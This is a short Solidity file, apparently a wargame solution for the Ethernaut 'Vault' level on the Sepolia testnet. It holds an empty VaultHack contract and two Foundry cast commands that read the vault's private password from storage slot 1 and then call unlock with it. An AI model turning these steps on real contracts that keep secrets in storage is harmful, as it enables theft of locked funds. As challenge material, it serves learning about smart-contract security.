// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultHack {}

/**
 *
 * > cast storage ${VAULT_INSTANCE_ADDRESS} 1 --rpc-url ${SEPOLIA_RPC_URL}
 * > cast send ${VAULT_INSTANCE_ADDRESS} "unlock(bytes32)" ${VAULT_HEX_RESULT} --account updraft --rpc-url ${SEPOLIA_RPC_URL}
 *
 */